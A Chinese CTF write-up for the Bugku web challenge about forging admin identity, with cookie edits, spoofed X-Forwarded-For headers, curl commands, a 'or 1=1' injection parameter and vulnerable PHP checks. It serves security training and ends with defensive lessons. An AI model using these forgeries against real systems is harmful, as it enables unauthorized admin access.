---
title: Bugku 好像需要管理员 - WEB
date: 2026-10-12 22:51:00
updated: 2026-10-12 22:51:00
description: Bugku 基础 30 题 第 25 题：Bugku 好像需要管理员 - WEB
cover: 
top_img: 
tags:
  - Bugku
  - WEB
  - 基础30题
categories:
  - WriteUp
keywords: Bugku,CTF,WriteUp,WEB
---

## 1. 题目信息
- 平台：Bugku CTF
- 分类：WEB
- 难度：★★☆☆☆
- 题目地址：https://ctf.bugku.com/challenges/detail/id/92.html
- 附件：无（或给了源码）

## 2. 题目描述
页面提示"好像需要管理员" / "you are not admin"。
**考身份伪造**。

## 3. 解题思路（一句话）
服务端判断"你是不是管理员"依赖**客户端可控的东西**（Cookie / 请求头 / 参数），
伪造它就行。

## 4. 详细步骤

### 4.1 第一步：看它靠什么判断（F12 → Network）
把每个可疑的地方都过一遍：

```
Cookie: is_admin=0            ← 最可能
Cookie: role=user
Cookie: user=guest
User-Agent: ...
Referer: ...
X-Forwarded-For: 你的IP        ← 也可能
```

### 4.2 第二步：逐项伪造

**① 改 Cookie（最常见）**
Console 里改，然后刷新：
```javascript
document.cookie = "is_admin=1; path=/";
document.cookie = "role=admin; path=/";
document.cookie = "user=admin; path=/";
```

或者用 **HackBar / Burp** 直接改请求头。

**② 改 `X-Forwarded-For`（伪装成本地访问）**
很多题的管理员页面**只允许 localhost 访问**：
```
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: localhost
X-Real-IP: 127.0.0.1
Client-IP: 127.0.0.1
```
用 curl 快速试：
```bash
curl -s -H "X-Forwarded-For: 127.0.0.1" "题目地址" | findstr /i flag
curl -s -H "Client-IP: 127.0.0.1" "题目地址" | findstr /i flag
```

**③ 改 URL 参数**
```
?admin=1
?isAdmin=true
?user=admin
?id=1 or 1=1
```

**④ 换路径**
有些题的管理员入口就是换个目录：
```
/admin/
/admin.php
/robots.txt        ← 常常直接写着管理后台路径
```

### 4.3 第三步：看源码确认
如果有源码，重点看：
```php
if ($_COOKIE['is_admin'] == '1') {
    echo $flag;
}
```
或
```php
if ($_SERVER['REMOTE_ADDR'] == '127.0.0.1') {
    echo $flag;
}
```
看清楚了就知道改哪个。

### 4.4 用 Burp 批量试（高效做法）
1. Burp 拦下请求 → `Ctrl+R` 发到 **Repeater**
2. 在 Repeater 里一条条改 Cookie / 请求头 → `Send`
3. 看哪个响应里有 flag

> **Repeater 是 Burp 里最有用的功能**，改一个参数点一次 Send，比刷新页面快 10 倍。

## 5. 关键知识点
- **身份认证必须在服务端完成**。如果"是不是管理员"写在 Cookie / 请求头里让客户端决定，那就是**越权漏洞**。
- **`X-Forwarded-For` 类请求头**：本来用于代理链传递真实 IP，
  但如果服务端**无条件信任**它来判断"是否本地访问"，就能被伪造。这叫 **IP 伪造 / 信任边界问题**。
- 常见越权类型：
  - **水平越权**：改 `user_id` 看别人的数据
  - **垂直越权**：普通用户干管理员的事（本题）
- 相关：**Cookie 篡改、Session 固定、JWT 未校验签名**。

## 6. 常见坑
- 改完 Cookie **一定要刷新页面**，有些站点了才知道变了。
- Cookie 有**签名 / 加密**（比如 `session=xxx` 是一串加密串）时改不了，那就换请求头路线。
- 一次只改一个变量，**逐个排除**，别一口气全改（改完不知道是哪个起的作用）。
